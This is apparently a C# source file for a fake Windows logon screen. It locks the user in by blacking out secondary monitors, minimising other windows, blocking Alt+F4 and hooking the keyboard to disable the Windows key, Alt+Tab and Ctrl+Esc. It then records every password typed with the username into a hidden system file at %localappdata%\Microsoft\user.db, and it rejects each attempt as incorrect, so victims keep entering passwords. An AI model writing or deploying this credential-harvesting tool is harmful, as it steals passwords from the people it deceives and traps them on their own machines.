using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ComponentModel;

namespace LeaveScr
{
    public partial class LeaveScr : Form
    {
        private bool success = false;
        [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
        public string Username { get; set; }
        [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
        public string DisplayName { get; set; }

        public LeaveScr()
        {
            InitializeComponent();
        }

        private void mtbPassword_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && e.Modifiers == Keys.Shift)
            {
                Exit();
                return;
            }

            if (e.KeyCode == Keys.Enter)
                ValidateCredentials();

            // Print to console
            Console.WriteLine(((MaskedTextBox)sender).Text);
        }

        private void pbSubmit_Click(object sender, EventArgs e)
        {
            ValidateCredentials();
        }

        private void ValidateCredentials()
        {
            // Validate password
            string password = mtbPassword.Text;


            // Output result of logon screen
            try
            {
                if (string.IsNullOrEmpty(password))

                    password = "[blank password]";

                // Even if a wrong password is typed, it might be valuable
                string line = string.Format("{0}: {1} --> {2}", this.Username, password, success ? "Correct" : "Wrong");
                Console.WriteLine(line);

                // Store username and password in %localappdata%\Microsoft\user.db
                string path = string.Format(@"{0}\Microsoft\user.db", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
                using (StreamWriter file = new StreamWriter(path, true))
                {
                    file.WriteLine(line);
                }

                // Hide file
                File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
                Console.WriteLine("Output written to {0}", path);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            // Ask again if password is incorrect
            if (!success)
            {
                // Show error
                lblError.Text = "The password is incorrect. Try again.";
                mtbPassword.Text = string.Empty;

                // Set focus on password box
                ActiveControl = mtbPassword;
            }
            // If correct password, save and close screen
            else
            {
                // Show all windows again
                IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
                SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);

                // Exit leave logon screen
                Application.Exit();
            }
        }

        private void Screen_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Block window from being closed using Alt + F4
            if (!success)
                e.Cancel = true;
        }

        private void Screen_Load(object sender, EventArgs e)
        {
            // Create new black fullscreen window on every additional screen
            foreach (Screen s in Screen.AllScreens)
            {
                if (s.Primary)
                    continue;

                var black = new Form()
                {
                    BackColor = Color.Black,
                    ShowIcon = false,
                    ShowInTaskbar = false,
                    WindowState = FormWindowState.Maximized,
                    MaximizeBox = false,
                    MinimizeBox = false,
                    FormBorderStyle = FormBorderStyle.None,
                    ControlBox = false,
                    StartPosition = FormStartPosition.Manual,
                    Location = new Point(s.WorkingArea.Left, s.WorkingArea.Top)
                };

                // Prevent black screen from being closed
                black.FormClosing += (fSender, fe) => fe.Cancel = true;

                // Show black screen
                black.Show();
            }

            // Set username
            if (!string.IsNullOrEmpty(DisplayName))
                lblUsername.Text = DisplayName;
            else if (!string.IsNullOrEmpty(Username))
                lblUsername.Text = Username;
            else
                lblUsername.Text = "User";

            // Set focus on password box
            ActiveControl = mtbPassword;

            // Disable WinKey, Alt+Tab, Ctrl+Esc
            // Source: https://stackoverflow.com/a/3227562
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);

            // Minimize all other windows
            // Source: https://stackoverflow.com/a/785110
            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
            SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);

            // Make this the active window
            WindowState = FormWindowState.Minimized;
            Show();
            WindowState = FormWindowState.Maximized;
            
        }

        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);

        const int WM_COMMAND = 0x111;
        const int MIN_ALL = 419;
        const int MIN_ALL_UNDO = 416;

        /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Starts Here */

        // Structure contain information about low-level keyboard input event 
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        //System level functions to be used for hook and unhook keyboard input  
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(Keys key);
        //Declaring Global objects     
        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;

        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
                /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Ends Here */
                // Disabling Windows keys 
                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                {
                    return (IntPtr)1; // if 0 is returned then All the above keys will be enabled
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        bool HasAltModifier(int flags)
        {
            return (flags & 0x20) == 0x20;
        }

        private int _counter = 0;

        private void pbUser_Click(object sender, EventArgs e)
        {
            Exit();
        }

        private void Exit()
        {
            _counter++;
            if (_counter > 2)
            {
                success = true;
                Application.Exit();
                Environment.Exit(1);
            }
        }
    }
}
